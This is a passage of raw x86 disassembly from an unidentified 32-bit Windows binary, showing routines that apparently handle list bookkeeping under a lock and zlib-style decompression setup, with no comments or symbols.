   1b2d7:	jmp    0x1b30c
   1b2d9:	mov    DWORD PTR [ebp-0x4],ebx
   1b2dc:	test   al,al
   1b2de:	je     0x1b2ef
   1b2e0:	mov    eax,DWORD PTR [edi+0x4]
   1b2e3:	cmp    ebx,DWORD PTR [eax]
   1b2e5:	je     0x1b2be
   1b2e7:	lea    ecx,[ebp-0x4]
   1b2ea:	call   0x1a548
   1b2ef:	push   DWORD PTR [ebp+0xc]
   1b2f2:	mov    eax,DWORD PTR [ebp-0x4]
   1b2f5:	add    eax,0xc
   1b2f8:	push   eax
   1b2f9:	call   0x19790
   1b2fe:	test   al,al
   1b300:	jne    0x1b2be
   1b302:	mov    eax,DWORD PTR [ebp+0x8]
   1b305:	mov    ecx,DWORD PTR [ebp-0x4]
   1b308:	mov    BYTE PTR [eax+0x4],0x0
   1b30c:	pop    edi
   1b30d:	pop    esi
   1b30e:	mov    DWORD PTR [eax],ecx
   1b310:	pop    ebx
   1b311:	leave  
   1b312:	ret    0x8
   1b315:	int3   
   1b316:	int3   
   1b317:	int3   
   1b318:	int3   
   1b319:	int3   
   1b31a:	mov    edi,edi
   1b31c:	push   ebp
   1b31d:	mov    ebp,esp
   1b31f:	push   ecx
   1b320:	push   ecx
   1b321:	push   DWORD PTR [ebp+0x8]
   1b324:	lea    eax,[ebp-0x8]
   1b327:	push   eax
   1b328:	call   0x1ac68
   1b32d:	and    DWORD PTR [ebp+0x8],0x0
   1b331:	lea    eax,[ebp+0x8]
   1b334:	push   eax
   1b335:	push   DWORD PTR [ebp-0x4]
   1b338:	push   DWORD PTR [ebp-0x8]
   1b33b:	call   0x1b134
   1b340:	mov    eax,DWORD PTR [ebp+0x8]
   1b343:	add    esp,0xc
   1b346:	leave  
   1b347:	ret    0x4
   1b34a:	int3   
   1b34b:	int3   
   1b34c:	int3   
   1b34d:	int3   
   1b34e:	int3   
   1b34f:	int3   
   1b350:	mov    edi,edi
   1b352:	push   ebp
   1b353:	mov    ebp,esp
   1b355:	push   ecx
   1b356:	push   esi
   1b357:	mov    esi,ecx
   1b359:	cmp    DWORD PTR [esi+0xc],0x0
   1b35d:	mov    ecx,DWORD PTR [ebp+0xc]
   1b360:	je     0x1b39a
   1b362:	mov    eax,DWORD PTR [esi+0x4]
   1b365:	cmp    ecx,DWORD PTR [eax]
   1b367:	jne    0x1b39a
   1b369:	cmp    DWORD PTR [ebp+0x10],eax
   1b36c:	jne    0x1b39a
   1b36e:	push   DWORD PTR [eax+0x4]
   1b371:	mov    ecx,esi
   1b373:	call   0x1b0ea
   1b378:	mov    ecx,DWORD PTR ds:0x7fa8c
   1b37e:	mov    eax,DWORD PTR [esi+0x4]
   1b381:	mov    DWORD PTR [eax+0x4],ecx
   1b384:	mov    eax,DWORD PTR [esi+0x4]
   1b387:	and    DWORD PTR [esi+0xc],0x0
   1b38b:	mov    DWORD PTR [eax],eax
   1b38d:	mov    eax,DWORD PTR [esi+0x4]
   1b390:	mov    DWORD PTR [eax+0x8],eax
   1b393:	mov    eax,DWORD PTR [esi+0x4]
   1b396:	mov    ecx,DWORD PTR [eax]
   1b398:	jmp    0x1b3bf
   1b39a:	cmp    ecx,DWORD PTR [ebp+0x10]
   1b39d:	je     0x1b3bf
   1b39f:	push   edi
   1b3a0:	mov    edi,ecx
   1b3a2:	lea    ecx,[ebp+0xc]
   1b3a5:	call   0x1a30e
   1b3aa:	push   edi
   1b3ab:	lea    eax,[ebp-0x4]
   1b3ae:	push   eax
   1b3af:	mov    ecx,esi
   1b3b1:	call   0x1ae6c
   1b3b6:	mov    ecx,DWORD PTR [ebp+0xc]
   1b3b9:	cmp    ecx,DWORD PTR [ebp+0x10]
   1b3bc:	jne    0x1b3a0
   1b3be:	pop    edi
   1b3bf:	mov    eax,DWORD PTR [ebp+0x8]
   1b3c2:	mov    DWORD PTR [eax],ecx
   1b3c4:	pop    esi
   1b3c5:	leave  
   1b3c6:	ret    0xc
   1b3c9:	int3   
   1b3ca:	int3   
   1b3cb:	int3   
   1b3cc:	int3   
   1b3cd:	int3   
   1b3ce:	mov    edi,edi
   1b3d0:	push   ebp
   1b3d1:	mov    ebp,esp
   1b3d3:	push   esi
   1b3d4:	push   DWORD PTR [ebp+0x8]
   1b3d7:	mov    esi,ecx
   1b3d9:	mov    ecx,DWORD PTR [esi]
   1b3db:	call   0x1b172
   1b3e0:	mov    eax,esi
   1b3e2:	pop    esi
   1b3e3:	pop    ebp
   1b3e4:	ret    0x4
   1b3e7:	int3   
   1b3e8:	int3   
   1b3e9:	int3   
   1b3ea:	int3   
   1b3eb:	int3   
   1b3ec:	mov    edi,edi
   1b3ee:	push   ebp
   1b3ef:	mov    ebp,esp
   1b3f1:	push   ecx
   1b3f2:	push   esi
   1b3f3:	push   edi
   1b3f4:	xor    edi,edi
   1b3f6:	push   edi
   1b3f7:	push   edi
   1b3f8:	push   edi
   1b3f9:	push   edi
   1b3fa:	mov    esi,0x7fa5c
   1b3ff:	push   esi
   1b400:	call   DWORD PTR ds:0x1ee28
   1b406:	test   eax,eax
   1b408:	jl     0x1b42c
   1b40a:	mov    eax,ds:0x7fa88
   1b40f:	mov    ecx,DWORD PTR ds:0x7fa80
   1b415:	add    eax,0x9
   1b418:	mov    DWORD PTR [ebp-0x4],eax
   1b41b:	lea    eax,[ebp-0x4]
   1b41e:	push   eax
   1b41f:	call   0x1b262
   1b424:	push   edi
   1b425:	push   esi
   1b426:	call   DWORD PTR ds:0x1ee24
   1b42c:	pop    edi
   1b42d:	pop    esi
   1b42e:	leave  
   1b42f:	ret    
   1b430:	int3   
   1b431:	int3   
   1b432:	int3   
   1b433:	int3   
   1b434:	int3   
   1b435:	int3   
   1b436:	mov    edi,edi
   1b438:	push   ebp
   1b439:	mov    ebp,esp
   1b43b:	push   ecx
   1b43c:	push   ecx
   1b43d:	push   DWORD PTR [ebp+0xc]
   1b440:	lea    eax,[ebp-0x8]
   1b443:	push   eax
   1b444:	call   0x1b280
   1b449:	mov    eax,DWORD PTR [ebp+0x8]
   1b44c:	mov    ecx,DWORD PTR [ebp-0x8]
   1b44f:	mov    DWORD PTR [eax],ecx
   1b451:	mov    cl,BYTE PTR [ebp-0x4]
   1b454:	mov    BYTE PTR [eax+0x4],cl
   1b457:	leave  
   1b458:	ret    0x8
   1b45b:	int3   
   1b45c:	int3   
   1b45d:	int3   
   1b45e:	int3   
   1b45f:	int3   
   1b460:	mov    edi,edi
   1b462:	push   ebp
   1b463:	mov    ebp,esp
   1b465:	push   ecx
   1b466:	push   ecx
   1b467:	push   esi
   1b468:	push   DWORD PTR [ebp+0x8]
   1b46b:	lea    eax,[ebp-0x8]
   1b46e:	push   eax
   1b46f:	mov    esi,ecx
   1b471:	call   0x1ac68
   1b476:	and    DWORD PTR [ebp+0x8],0x0
   1b47a:	lea    eax,[ebp+0x8]
   1b47d:	push   eax
   1b47e:	push   DWORD PTR [ebp-0x4]
   1b481:	push   DWORD PTR [ebp-0x8]
   1b484:	call   0x1b134
   1b489:	add    esp,0xc
   1b48c:	push   DWORD PTR [ebp-0x4]
   1b48f:	lea    eax,[ebp-0x4]
   1b492:	push   DWORD PTR [ebp-0x8]
   1b495:	mov    ecx,esi
   1b497:	push   eax
   1b498:	call   0x1b350
   1b49d:	mov    eax,DWORD PTR [ebp+0x8]
   1b4a0:	pop    esi
   1b4a1:	leave  
   1b4a2:	ret    0x4
   1b4a5:	int3   
   1b4a6:	int3   
   1b4a7:	int3   
   1b4a8:	int3   
   1b4a9:	int3   
   1b4aa:	mov    edi,edi
   1b4ac:	push   ebp
   1b4ad:	mov    ebp,esp
   1b4af:	jmp    0x1b4c2
   1b4b1:	push   eax
   1b4b2:	lea    ecx,[ebp+0x2c]
   1b4b5:	call   0x1b3ce
   1b4ba:	lea    ecx,[ebp+0xc]
   1b4bd:	call   0x1a3d6
   1b4c2:	mov    eax,DWORD PTR [ebp+0x14]
   1b4c5:	cmp    eax,DWORD PTR [ebp+0x24]
   1b4c8:	jne    0x1b4b1
   1b4ca:	mov    eax,DWORD PTR [ebp+0x8]
   1b4cd:	mov    ecx,DWORD PTR [ebp+0x2c]
   1b4d0:	mov    DWORD PTR [eax],ecx
   1b4d2:	pop    ebp
   1b4d3:	ret    0x28
   1b4d6:	int3   
   1b4d7:	int3   
   1b4d8:	int3   
   1b4d9:	int3   
   1b4da:	int3   
   1b4db:	int3   
   1b4dc:	mov    edi,edi
   1b4de:	push   ebp
   1b4df:	mov    ebp,esp
   1b4e1:	sub    esp,0x10
   1b4e4:	push   0xffffffff
   1b4e6:	push   DWORD PTR [ebp+0x8]
   1b4e9:	lea    ecx,[ebp-0x8]
   1b4ec:	call   0x1109a
   1b4f1:	mov    ecx,DWORD PTR ds:0x7fa7c
   1b4f7:	lea    eax,[ebp-0x8]
   1b4fa:	push   eax
   1b4fb:	lea    eax,[ebp-0x10]
   1b4fe:	push   eax
   1b4ff:	call   0x1b436
   1b504:	push   DWORD PTR [ebp-0x8]
   1b507:	call   0x1d9f8
   1b50c:	pop    ecx
   1b50d:	leave  
   1b50e:	ret    0x4
   1b511:	int3   
   1b512:	int3   
   1b513:	int3   
   1b514:	int3   
   1b515:	int3   
   1b516:	mov    edi,edi
   1b518:	push   ebp
   1b519:	mov    ebp,esp
   1b51b:	xor    eax,eax
   1b51d:	push   ebx
   1b51e:	push   esi
   1b51f:	push   edi
   1b520:	mov    ebx,ecx
   1b522:	mov    DWORD PTR [ebx+0x4],eax
   1b525:	mov    DWORD PTR [ebx+0x8],eax
   1b528:	mov    DWORD PTR [ebx+0xc],eax
   1b52b:	mov    DWORD PTR [ebx+0x10],eax
   1b52e:	mov    DWORD PTR [ebx+0x14],eax
   1b531:	mov    DWORD PTR [ebx+0x18],eax
   1b534:	mov    DWORD PTR [ebx+0x1c],eax
   1b537:	mov    DWORD PTR [ebx+0x20],eax
   1b53a:	mov    DWORD PTR [ebx+0x24],eax
   1b53d:	mov    DWORD PTR [ebx+0x28],eax
   1b540:	mov    DWORD PTR [ebx+0x2c],eax
   1b543:	mov    eax,DWORD PTR [ebp+0x8]
   1b546:	push   ebx
   1b547:	sub    esp,0x10
   1b54a:	mov    edi,esp
   1b54c:	lea    esi,[eax+0x14]
   1b54f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b550:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b551:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b552:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b553:	sub    esp,0x10
   1b556:	lea    esi,[eax+0x4]
   1b559:	mov    edi,esp
   1b55b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b55c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b55d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b55e:	lea    eax,[ebp+0x8]
   1b561:	push   eax
   1b562:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b563:	call   0x1b4aa
   1b568:	pop    edi
   1b569:	pop    esi
   1b56a:	mov    eax,ebx
   1b56c:	pop    ebx
   1b56d:	pop    ebp
   1b56e:	ret    0x4
   1b571:	int3   
   1b572:	int3   
   1b573:	int3   
   1b574:	int3   
   1b575:	int3   
   1b576:	mov    edi,edi
   1b578:	push   ebp
   1b579:	mov    ebp,esp
   1b57b:	push   ecx
   1b57c:	push   ebx
   1b57d:	push   0x30
   1b57f:	call   0x10a52
   1b584:	xor    ebx,ebx
   1b586:	pop    ecx
   1b587:	cmp    eax,ebx
   1b589:	je     0x1b59d
   1b58b:	lea    ecx,[ebp-0x1]
   1b58e:	push   ecx
   1b58f:	mov    ecx,eax
   1b591:	call   0x1a45c
   1b596:	mov    ds:0x7fa84,eax
   1b59b:	jmp    0x1b5a3
   1b59d:	mov    DWORD PTR ds:0x7fa84,ebx
   1b5a3:	push   esi
   1b5a4:	push   0x10
   1b5a6:	call   0x10a52
   1b5ab:	mov    esi,eax
   1b5ad:	pop    ecx
   1b5ae:	cmp    esi,ebx
   1b5b0:	je     0x1b5c4
   1b5b2:	mov    ecx,esi
   1b5b4:	mov    BYTE PTR [esi+0x8],bl
   1b5b7:	call   0x1ac9a
   1b5bc:	mov    DWORD PTR ds:0x7fa7c,esi
   1b5c2:	jmp    0x1b5ca
   1b5c4:	mov    DWORD PTR ds:0x7fa7c,ebx
   1b5ca:	push   0xc
   1b5cc:	call   0x10a52
   1b5d1:	pop    ecx
   1b5d2:	pop    esi
   1b5d3:	cmp    eax,ebx
   1b5d5:	je     0x1b5e9
   1b5d7:	lea    ecx,[ebp-0x1]
   1b5da:	push   ecx
   1b5db:	mov    ecx,eax
   1b5dd:	call   0x1aaae
   1b5e2:	mov    ds:0x7fa80,eax
   1b5e7:	jmp    0x1b5ef
   1b5e9:	mov    DWORD PTR ds:0x7fa80,ebx
   1b5ef:	push   ebx
   1b5f0:	push   0x7fa5c
   1b5f5:	call   0x11c02
   1b5fa:	call   eax
   1b5fc:	mov    DWORD PTR ds:0x7fa88,0x1
   1b606:	pop    ebx
   1b607:	leave  
   1b608:	ret    
   1b609:	int3   
   1b60a:	int3   
   1b60b:	int3   
   1b60c:	int3   
   1b60d:	int3   
   1b60e:	push   0x3c
   1b610:	push   0x7e230
   1b615:	call   0x1dab8
   1b61a:	xor    esi,esi
   1b61c:	push   esi
   1b61d:	push   esi
   1b61e:	push   esi
   1b61f:	push   esi
   1b620:	push   0x7fa5c
   1b625:	call   DWORD PTR ds:0x1ee28
   1b62b:	cmp    eax,esi
   1b62d:	jl     0x1b79d
   1b633:	mov    DWORD PTR [ebp-0x4],esi
   1b636:	mov    edi,DWORD PTR [ebp+0x8]
   1b639:	push   edi
   1b63a:	lea    eax,[ebp-0x24]
   1b63d:	push   eax
   1b63e:	call   0x1a63e
   1b643:	cmp    DWORD PTR [eax+0x4],esi
   1b646:	setne  BYTE PTR [ebp-0x19]
   1b64a:	push   DWORD PTR [ebp-0x24]
   1b64d:	call   0x1d9f8
   1b652:	pop    ecx
   1b653:	push   edi
   1b654:	lea    eax,[ebp-0x2c]
   1b657:	push   eax
   1b658:	call   0x1a664
   1b65d:	xor    al,al
   1b65f:	cmp    DWORD PTR [edi+0x14],esi
   1b662:	jne    0x1b678
   1b664:	lea    eax,[ebp-0x2c]
   1b667:	push   eax
   1b668:	mov    ecx,DWORD PTR ds:0x7fa7c
   1b66e:	call   0x1b31a
   1b673:	test   eax,eax
   1b675:	setne  al
   1b678:	test   al,al
   1b67a:	je     0x1b68b
   1b67c:	lea    eax,[ebp-0x2c]
   1b67f:	push   eax
   1b680:	mov    ecx,DWORD PTR ds:0x7fa7c
   1b686:	call   0x1b460
   1b68b:	mov    ebx,DWORD PTR ds:0x7fa84
   1b691:	cmp    DWORD PTR [ebx+0x2c],esi
   1b694:	jbe    0x1b6f4
   1b696:	mov    eax,ds:0x7ef24
   1b69b:	mov    DWORD PTR [ebp-0x20],eax
   1b69e:	cmp    eax,esi
   1b6a0:	ja     0x1b6a9
   1b6a2:	mov    DWORD PTR [ebp-0x20],0x1
   1b6a9:	mov    eax,DWORD PTR [ebp-0x20]
   1b6ac:	cmp    DWORD PTR [ebx+0x2c],eax
   1b6af:	jb     0x1b6f4
   1b6b1:	lea    esi,[ebx+0x4]
   1b6b4:	lea    edi,[ebp-0x3c]
   1b6b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b6b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b6b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b6ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b6bb:	mov    eax,DWORD PTR [ebp-0x34]
   1b6be:	mov    eax,DWORD PTR [eax]
   1b6c0:	mov    eax,DWORD PTR [eax+0xc]
   1b6c3:	xor    ecx,ecx
   1b6c5:	add    eax,0x9c40
   1b6ca:	push   ecx
   1b6cb:	pop    esi
   1b6cc:	adc    ecx,esi
   1b6ce:	mov    edx,DWORD PTR [ebp+0x8]
   1b6d1:	mov    edx,DWORD PTR [edx+0xc]
   1b6d4:	cmp    ecx,esi
   1b6d6:	ja     0x1b6f4
   1b6d8:	jb     0x1b6de
   1b6da:	cmp    eax,edx
   1b6dc:	jae    0x1b6f4
   1b6de:	mov    ecx,ebx
   1b6e0:	call   0x1a48a
   1b6e5:	mov    ecx,ebx
   1b6e7:	call   0x1aa92
   1b6ec:	mov    ebx,DWORD PTR ds:0x7fa84
   1b6f2:	jmp    0x1b6a9
   1b6f4:	push   DWORD PTR [ebp+0x8]
   1b6f7:	lea    eax,[ebp-0x24]
   1b6fa:	push   eax
   1b6fb:	call   0x1a664
   1b700:	push   eax
   1b701:	lea    eax,[ebp-0x3c]
   1b704:	push   eax
   1b705:	call   0x1a6b0
   1b70a:	push   DWORD PTR [ebp-0x24]
   1b70d:	call   0x1d9f8
   1b712:	pop    ecx
   1b713:	mov    ebx,DWORD PTR ds:0x7fa84
   1b719:	lea    esi,[ebx+0x14]
   1b71c:	lea    edi,[ebp-0x4c]
   1b71f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b720:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b721:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b722:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b723:	mov    esi,DWORD PTR [ebp-0x34]
   1b726:	cmp    esi,DWORD PTR [ebp-0x44]
   1b729:	je     0x1b75d
   1b72b:	mov    eax,DWORD PTR [esi]
   1b72d:	mov    BYTE PTR [eax+0x1c],0x0
   1b731:	mov    eax,DWORD PTR [esi]
   1b733:	cmp    BYTE PTR [eax+0x24],0x0
   1b737:	jne    0x1b747
   1b739:	mov    BYTE PTR [eax+0x24],0x1
   1b73d:	mov    eax,DWORD PTR [esi]
   1b73f:	push   DWORD PTR [eax+0x8]
   1b742:	call   0x1a404
   1b747:	mov    eax,DWORD PTR [esi]
   1b749:	mov    ecx,DWORD PTR [eax+0x8]
   1b74c:	mov    eax,DWORD PTR [ebp+0x8]
   1b74f:	mov    DWORD PTR [eax+0x8],ecx
   1b752:	mov    ecx,DWORD PTR [esi]
   1b754:	mov    ecx,DWORD PTR [ecx+0x20]
   1b757:	inc    ecx
   1b758:	mov    DWORD PTR [eax+0x20],ecx
   1b75b:	jmp    0x1b760
   1b75d:	mov    eax,DWORD PTR [ebp+0x8]
   1b760:	mov    cl,BYTE PTR [ebp-0x19]
   1b763:	mov    BYTE PTR [eax+0x1c],cl
   1b766:	lea    eax,[ebp+0x8]
   1b769:	push   eax
   1b76a:	mov    ecx,ebx
   1b76c:	call   0x1b172
   1b771:	inc    DWORD PTR ds:0x7fa88
   1b777:	push   DWORD PTR [ebp-0x2c]
   1b77a:	call   0x1d9f8
   1b77f:	pop    ecx
   1b780:	jmp    0x1b789
   1b782:	xor    eax,eax
   1b784:	inc    eax
   1b785:	ret    
   1b786:	mov    esp,DWORD PTR [ebp-0x18]
   1b789:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1b790:	push   0x0
   1b792:	push   0x7fa5c
   1b797:	call   DWORD PTR ds:0x1ee24
   1b79d:	call   0x1dafd
   1b7a2:	ret    0x4
   1b7a5:	int3   
   1b7a6:	int3   
   1b7a7:	int3   
   1b7a8:	int3   
   1b7a9:	int3   
   1b7aa:	push   0x48
   1b7ac:	push   0x7e250
   1b7b1:	call   0x1dab8
   1b7b6:	xor    ebx,ebx
   1b7b8:	push   ebx
   1b7b9:	push   ebx
   1b7ba:	push   ebx
   1b7bb:	push   ebx
   1b7bc:	push   0x7fa5c
   1b7c1:	call   DWORD PTR ds:0x1ee28
   1b7c7:	cmp    eax,ebx
   1b7c9:	jl     0x1b877
   1b7cf:	mov    DWORD PTR [ebp-0x4],ebx
   1b7d2:	push   DWORD PTR ds:0x7fa80
   1b7d8:	lea    ecx,[ebp-0x28]
   1b7db:	call   0x1b1cc
   1b7e0:	mov    BYTE PTR [ebp-0x19],bl
   1b7e3:	cmp    DWORD PTR [ebp-0x20],ebx
   1b7e6:	je     0x1b806
   1b7e8:	mov    eax,DWORD PTR [ebp-0x24]
   1b7eb:	mov    eax,DWORD PTR [eax]
   1b7ed:	mov    eax,DWORD PTR [eax+0x8]
   1b7f0:	cmp    eax,DWORD PTR ds:0x7fa88
   1b7f6:	ja     0x1b806
   1b7f8:	mov    BYTE PTR [ebp-0x19],0x1
   1b7fc:	lea    ecx,[ebp-0x28]
   1b7ff:	call   0x1ab08
   1b804:	jmp    0x1b7e3
   1b806:	cmp    BYTE PTR [ebp-0x19],bl
   1b809:	je     0x1b841
   1b80b:	push   DWORD PTR ds:0x7fa84
   1b811:	lea    ecx,[ebp-0x58]
   1b814:	call   0x1b516
   1b819:	mov    esi,DWORD PTR [ebp+0x8]
   1b81c:	push   esi
   1b81d:	lea    eax,[ebp-0x58]
   1b820:	push   eax
   1b821:	call   0x1a74e
   1b826:	cmp    DWORD PTR [esi],ebx
   1b828:	jne    0x1b839
   1b82a:	lea    eax,[ebp-0x28]
   1b82d:	push   eax
   1b82e:	mov    ecx,DWORD PTR ds:0x7fa80
   1b834:	call   0x1b20a
   1b839:	lea    ecx,[ebp-0x58]
   1b83c:	call   0x1b156
   1b841:	lea    ecx,[ebp-0x28]
   1b844:	call   0x1aad4
   1b849:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1b850:	jmp    0x1b86b
   1b852:	xor    eax,eax
   1b854:	inc    eax
   1b855:	ret    
   1b856:	mov    esp,DWORD PTR [ebp-0x18]
   1b859:	mov    eax,DWORD PTR [ebp+0x8]
   1b85c:	mov    DWORD PTR [eax],0x2
   1b862:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1b869:	xor    ebx,ebx
   1b86b:	push   ebx
   1b86c:	push   0x7fa5c
   1b871:	call   DWORD PTR ds:0x1ee24
   1b877:	call   0x1dafd
   1b87c:	ret    0x4
   1b87f:	int3   
   1b880:	int3   
   1b881:	int3   
   1b882:	int3   
   1b883:	int3   
   1b884:	mov    edi,edi
   1b886:	push   ebp
   1b887:	mov    ebp,esp
   1b889:	mov    ecx,DWORD PTR [ebp+0x8]
   1b88c:	xor    edx,edx
   1b88e:	cmp    ecx,edx
   1b890:	je     0x1b8e0
   1b892:	mov    eax,DWORD PTR [ecx+0x1c]
   1b895:	cmp    eax,edx
   1b897:	je     0x1b8e0
   1b899:	mov    DWORD PTR [eax+0x1c],edx
   1b89c:	mov    DWORD PTR [ecx+0x14],edx
   1b89f:	mov    DWORD PTR [ecx+0x8],edx
   1b8a2:	mov    DWORD PTR [ecx+0x18],edx
   1b8a5:	mov    DWORD PTR [ecx+0x30],0x1
   1b8ac:	lea    ecx,[eax+0x530]
   1b8b2:	mov    DWORD PTR [eax],edx
   1b8b4:	mov    DWORD PTR [eax+0x4],edx
   1b8b7:	mov    DWORD PTR [eax+0xc],edx
   1b8ba:	mov    DWORD PTR [eax+0x14],0x8000
   1b8c1:	mov    DWORD PTR [eax+0x20],edx
   1b8c4:	mov    DWORD PTR [eax+0x28],edx
   1b8c7:	mov    DWORD PTR [eax+0x2c],edx
   1b8ca:	mov    DWORD PTR [eax+0x30],edx
   1b8cd:	mov    DWORD PTR [eax+0x38],edx
   1b8d0:	mov    DWORD PTR [eax+0x3c],edx
   1b8d3:	mov    DWORD PTR [eax+0x6c],ecx
   1b8d6:	mov    DWORD PTR [eax+0x50],ecx
   1b8d9:	mov    DWORD PTR [eax+0x4c],ecx
   1b8dc:	xor    eax,eax
   1b8de:	jmp    0x1b8e3
   1b8e0:	push   0xfffffffe
   1b8e2:	pop    eax
   1b8e3:	pop    ebp
   1b8e4:	ret    0x4
   1b8e7:	int3   
   1b8e8:	int3   
   1b8e9:	int3   
   1b8ea:	int3   
   1b8eb:	int3   
   1b8ec:	mov    edi,edi
   1b8ee:	push   ebp
   1b8ef:	mov    ebp,esp
   1b8f1:	mov    eax,DWORD PTR [ebp+0x10]
   1b8f4:	push   esi
   1b8f5:	push   edi
   1b8f6:	xor    edi,edi
   1b8f8:	cmp    eax,edi
   1b8fa:	je     0x1b995
   1b900:	cmp    BYTE PTR [eax],0x31
   1b903:	jne    0x1b995
   1b909:	cmp    DWORD PTR [ebp+0x14],0x38
   1b90d:	jne    0x1b995
   1b913:	mov    esi,DWORD PTR [ebp+0x8]
   1b916:	cmp    esi,edi
   1b918:	jne    0x1b91e
   1b91a:	push   0xfffffffe
   1b91c:	jmp    0x1b997
   1b91e:	mov    DWORD PTR [esi+0x18],edi
   1b921:	cmp    DWORD PTR [esi+0x20],edi
   1b924:	jne    0x1b930
   1b926:	mov    DWORD PTR [esi+0x20],0x1cce4
   1b92d:	mov    DWORD PTR [esi+0x28],edi
   1b930:	cmp    DWORD PTR [esi+0x24],edi
   1b933:	jne    0x1b93c
   1b935:	mov    DWORD PTR [esi+0x24],0x1cd00
   1b93c:	push   0x2530
   1b941:	push   0x1
   1b943:	push   DWORD PTR [esi+0x28]
   1b946:	call   DWORD PTR [esi+0x20]
   1b949:	cmp    eax,edi
   1b94b:	jne    0x1b951
   1b94d:	push   0xfffffffc
   1b94f:	jmp    0x1b997
   1b951:	mov    ecx,DWORD PTR [ebp+0xc]
   1b954:	cmp    ecx,edi
   1b956:	mov    DWORD PTR [esi+0x1c],eax
   1b959:	jge    0x1b962
   1b95b:	mov    DWORD PTR [eax+0x8],edi
   1b95e:	neg    ecx
   1b960:	jmp    0x1b973
   1b962:	mov    edx,ecx
   1b964:	sar    edx,0x4
   1b967:	inc    edx
   1b968:	cmp    ecx,0x30
   1b96b:	mov    DWORD PTR [eax+0x8],edx
   1b96e:	jge    0x1b973
   1b970:	and    ecx,0xf
   1b973:	lea    edx,[ecx-0x8]
   1b976:	cmp    edx,0x7
   1b979:	ja     0x1b989
   1b97b:	push   esi
   1b97c:	mov    DWORD PTR [eax+0x24],ecx
   1b97f:	mov    DWORD PTR [eax+0x34],edi
   1b982:	call   0x1b884
   1b987:	jmp    0x1b998
   1b989:	push   eax
   1b98a:	push   DWORD PTR [esi+0x28]
   1b98d:	call   DWORD PTR [esi+0x24]
   1b990:	mov    DWORD PTR [esi+0x1c],edi
   1b993:	jmp    0x1b91a
   1b995:	push   0xfffffffa
   1b997:	pop    eax
   1b998:	pop    edi
   1b999:	pop    esi
   1b99a:	pop    ebp
   1b99b:	ret    0x10
   1b99e:	int3   
   1b99f:	int3   
   1b9a0:	int3   
   1b9a1:	int3   
   1b9a2:	int3   
   1b9a3:	int3   
   1b9a4:	mov    edi,edi
   1b9a6:	push   ebp
   1b9a7:	mov    ebp,esp
   1b9a9:	push   ecx
   1b9aa:	push   ebx
   1b9ab:	push   esi
   1b9ac:	mov    esi,DWORD PTR [edi+0x1c]
   1b9af:	cmp    DWORD PTR [esi+0x34],0x0
   1b9b3:	mov    ebx,eax
   1b9b5:	jne    0x1b9d5
   1b9b7:	mov    ecx,DWORD PTR [esi+0x24]
   1b9ba:	xor    eax,eax
   1b9bc:	inc    eax
   1b9bd:	shl    eax,cl
   1b9bf:	push   0x1
   1b9c1:	push   eax
   1b9c2:	push   DWORD PTR [edi+0x28]
   1b9c5:	call   DWORD PTR [edi+0x20]
   1b9c8:	mov    DWORD PTR [esi+0x34],eax
   1b9cb:	test   eax,eax
   1b9cd:	jne    0x1b9d5
   1b9cf:	inc    eax
   1b9d0:	jmp    0x1ba77
   1b9d5:	xor    eax,eax
   1b9d7:	cmp    DWORD PTR [esi+0x28],eax
   1b9da:	jne    0x1b9ed
   1b9dc:	mov    ecx,DWORD PTR [esi+0x24]
   1b9df:	xor    edx,edx
   1b9e1:	inc    edx
   1b9e2:	shl    edx,cl
   1b9e4:	mov    DWORD PTR [esi+0x30],eax
   1b9e7:	mov    DWORD PTR [esi+0x2c],eax
   1b9ea:	mov    DWORD PTR [esi+0x28],edx
   1b9ed:	sub    ebx,DWORD PTR [edi+0x10]
   1b9f0:	mov    eax,DWORD PTR [esi+0x28]
   1b9f3:	cmp    ebx,eax
   1b9f5:	jb     0x1ba0f
   1b9f7:	mov    ecx,DWORD PTR [edi+0xc]
   1b9fa:	push   eax
   1b9fb:	sub    ecx,eax
   1b9fd:	push   ecx
   1b9fe:	push   DWORD PTR [esi+0x34]
   1ba01:	call   0x1da7a
   1ba06:	add    esp,0xc
   1ba09:	and    DWORD PTR [esi+0x30],0x0
   1ba0d:	jmp    0x1ba50
   1ba0f:	sub    eax,DWORD PTR [esi+0x30]
   1ba12:	mov    DWORD PTR [ebp-0x4],eax
   1ba15:	cmp    eax,ebx
   1ba17:	jbe    0x1ba1c
   1ba19:	mov    DWORD PTR [ebp-0x4],ebx
   1ba1c:	mov    eax,DWORD PTR [edi+0xc]
   1ba1f:	push   DWORD PTR [ebp-0x4]
   1ba22:	sub    eax,ebx
   1ba24:	push   eax
   1ba25:	mov    eax,DWORD PTR [esi+0x34]
   1ba28:	add    eax,DWORD PTR [esi+0x30]
   1ba2b:	push   eax
   1ba2c:	call   0x1da7a
   1ba31:	mov    eax,DWORD PTR [ebp-0x4]
   1ba34:	add    esp,0xc
   1ba37:	sub    ebx,eax
   1ba39:	je     0x1ba58
   1ba3b:	mov    eax,DWORD PTR [edi+0xc]
   1ba3e:	push   ebx
   1ba3f:	sub    eax,ebx
   1ba41:	push   eax
   1ba42:	push   DWORD PTR [esi+0x34]
   1ba45:	call   0x1da7a
   1ba4a:	add    esp,0xc
   1ba4d:	mov    DWORD PTR [esi+0x30],ebx
   1ba50:	mov    eax,DWORD PTR [esi+0x28]
   1ba53:	mov    DWORD PTR [esi+0x2c],eax
   1ba56:	jmp    0x1ba75
   1ba58:	add    DWORD PTR [esi+0x30],eax
